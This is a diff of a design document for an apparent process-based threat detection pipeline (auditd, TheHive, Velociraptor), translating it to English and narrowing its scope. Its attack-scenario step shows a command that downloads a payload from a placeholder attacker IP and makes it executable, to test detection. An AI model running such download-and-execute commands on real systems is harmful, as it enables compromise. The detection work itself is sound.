@@ -1,8 +1,13 @@
 # Phase 5 — Endpoint Telemetry (Process-Focused)
 
+> [!NOTE]
+> This document preserves Phase5-specific implementation history and
+> validation context. The [main Roadmap](roadmap.md) is authoritative for current
+> status, active priority, incomplete work, and Done Criteria.
+
 ## 🎯 Goal
 
-ログベース検知から **プロセスベース検知へ進化する**
+Evolve from log-based detection to **process-based detection**
 
 ---
 
@@ -10,11 +15,11 @@
 
 - Detect = deterministic
 - AI = triage / analysis
-- DFIR = follow-on（Velociraptor）
+- DFIR = follow-on (Velociraptor)
 
-Phase5では「可視性」を強化する：
+Phase5 strengthens visibility:
 
-👉 **Process visibility の導入**
+👉 **Introduce process visibility**
 
 ---
 
@@ -33,49 +38,50 @@ scenario
 → action planning
 → playbook
 → executor
-→ Velociraptor (on-demand)
+→ collection request generation (Velociraptor adapter boundary)
 ```
 
 ---
 
 ## 🔧 Scope
 
-### ✅ Do（Phase5 MVP）
+### ✅ Do (Phase5 MVP)
 
-- auditdでprocess execution取得（execve）
-- process event正規化（ISO8601 timestamp）
-- process chain detection（behavior）
-- incident / triage / case のrun単位出力
-- caseにprocess timeline / summary追加
-- severityをprocessベースで補正
-- TheHive に case / observables を連携
-- action-agent で playbook を生成
-- executor-agent で playbook を実行
-- Velociraptorで補助調査
-- decision_log に detection / triage / action / execution を記録
+- Collect process execution with auditd (execve)
+- Normalize process events (ISO 8601 timestamps)
+- Detect process chains (behavior)
+- Produce incident / triage / case outputs per run
+- Add a process timeline and summary to the case
+- Adjust severity based on process evidence
+- Integrate the case and observables with TheHive
+- Generate a playbook with action-agent
+- Execute the playbook with executor-agent
+- Generate a schema-validated Velociraptor `collection_request.json`; direct API execution and live result ingestion are outside this boundary
+- Record detection / triage / action / execution in decision_log
 
 ### ❌ Do NOT
 
-- フルEDR再現
-- network / file telemetry 同時実装
-- 多数シナリオ追加
-- lateral movement の広範囲対応
+- Reproduce a full EDR
+- Implement network and file telemetry at the same time
+- Add a large number of scenarios
+- Provide broad lateral-movement coverage
 - fully autonomous containment
+- Execute the Velociraptor API or claim live collection from the request-generator boundary
 
 ---
 
 ## 🚀 Implementation Steps
 
-### Step1: auditd導入
+### Step1: Introduce auditd
 
-目的：
+Purpose:
 
-- execveイベント取得
-- プロセスレベル可視化
+- Collect execve events
+- Provide process-level visibility
 
 ---
 
-### Step2: 攻撃シナリオ
+### Step2: Attack Scenario
 
 ```bash
 curl -o /tmp/payload.sh http://<attacker_ip>/payload.sh
@@ -104,7 +110,7 @@ chmod +x /tmp/payload.sh
 
 ---
 
-### Step4: Detection（Behavior）
+### Step4: Detection (Behavior)
 
 Rule:
 
@@ -112,11 +118,11 @@ Rule:
 download → chmod → execute
 ```
 
-特徴：
+Characteristics:
 
-- 複数イベントの連鎖
-- 時間ウィンドウ（5分）
-- host / user で相関
+- Correlate a chain of multiple events
+- Use a five-minute time window
+- Correlate by host and user
 
 ---
 
@@ -163,10 +169,10 @@ download → chmod → execute
 ```text
 deterministic (process chain)
 → triage (verdict / risk_score)
-→ severity決定
+→ determine severity
 ```
 
-例：
+Example:
 
 - download → chmod → execute → **high**
 - verdict=malicious + risk_score>=80 → **high**
@@ -175,15 +181,15 @@ deterministic (process chain)
 
 ### Step8: TheHive
 
-- case作成
-- observable追加
+- Create a case
+- Add observables
   - ip
   - url
   - hostname
   - filename
   - user(other)
 
-👉 process-based case を SOC視点で可視化する
+👉 Present the process-based case from a SOC perspective
 
 ---
 
@@ -195,7 +201,7 @@ triage
 → playbook.steps
 ```
 
-例：
+Example:
 
 ```json
 {
@@ -218,11 +224,11 @@ triage
 
 ### Step10: Executor / Approval
 
-- executor-agent で playbook 実行
-- safe step は自動実行
-- sensitive step は approval gate
+- Execute the playbook with executor-agent
+- Execute safe steps automatically
+- Place sensitive steps behind an approval gate
 
-例：
+Example:
 
 - request_dfir_collection → auto
 - alert_soc_team → auto
@@ -231,13 +237,13 @@ triage
 
 ---
 
-### Step11: Velociraptor（enrichment）
+### Step11: Velociraptor Request Adapter
 
-- Linux.BashHistory
-- Linux.ProcessList
+- Map the Case and action context to requested artifacts such as `Linux.BashHistory` and `Linux.ProcessList`
+- Validate and emit `collection_request.json`
+- Keep actual Velociraptor API execution and live collection-result ingestion as follow-on work
 
-👉 常時収集しない  
-👉 case / playbook トリガーで実行
+👉 The implemented boundary is on-demand request generation, not continuous or live collection
 
 ---
 
@@ -258,11 +264,17 @@ data/runs/<run_id>/
 
 ---
 
-## 🎯 Detection Targets
+## 🎯 Historical Detection Targets
 
-1. download → chmod → execute（実装済み）
-2. suspicious shell execution（次フェーズ）
-3. behavior feature ベース検知への移行（次フェーズ）
+This list records the Phase5 planning targets. Current implementation status and
+active priorities are owned by the [Main Roadmap](roadmap.md).
+
+1. download → chmod → execute: implemented in Phase5
+2. standalone suspicious shell execution: not implemented as an independent
+   Phase5 Linux detection target; shell-related process filtering alone is not
+   a detection
+3. transition to behavior-feature-based detection: implemented in Phase6 for
+   the current bounded paths; broader detection expansion remains separate work
 
 ---
 
@@ -286,9 +298,9 @@ run-based
 
 - auditd
 
-### Investigation
+### Investigation Request Boundary
 
-- Velociraptor（DFIR）
+- Velociraptor adapter (`collection_request.json` generation only)
 
 ### Case / Workflow
 
@@ -300,33 +312,33 @@ run-based
 
 ## ✅ Done Criteria
 
-- auditdでexecve取得できる
-- process eventがISO形式でJSON化される
-- process chain検知が動く
-- caseにprocess timeline / summaryが含まれる
-- severityがprocessベースで補正される
-- TheHive に case / observables を送れる
-- action-agent が playbook を生成できる
-- executor-agent が playbook を実行できる
-- approval required step を分離できる
-- Velociraptorで補助調査できる
-- decision_log に detection / triage / action / execution が残る
+- auditd can collect execve events
+- Process events are serialized as JSON with ISO timestamps
+- Process-chain detection works
+- The case includes a process timeline and summary
+- Severity is adjusted based on process evidence
+- The case and observables can be sent to TheHive
+- action-agent can generate a playbook
+- executor-agent can execute a playbook
+- Approval-required steps can be separated
+- The Velociraptor adapter can generate a schema-validated collection request without claiming direct API execution or live result ingestion
+- decision_log retains detection / triage / action / execution records
 
 ---
 
 ## 🔥 First Step
 
 ```text
-auditdでexecveログ取得確認
+Confirm that auditd collects execve logs
 ```
 
 ---
 
 ## 💡 Why Phase5 Matters
 
-- 攻撃の「流れ」が見える
-- 単一ログではなく「行動」で検知
-- caseの説明力が大幅向上
-- EDRに近い検知モデルに進化
-- planning / execution / approval の分離ができる
-- Phase6 の behavior-feature 化 / improvement loop の土台になる
+- Makes the attack sequence visible
+- Detects behavior rather than isolated log entries
+- Greatly improves the explanatory value of the case
+- Evolves toward an EDR-like detection model
+- Separates planning, execution, and approval
+- Establishes the foundation for Phase6 behavior features and the improvement loop
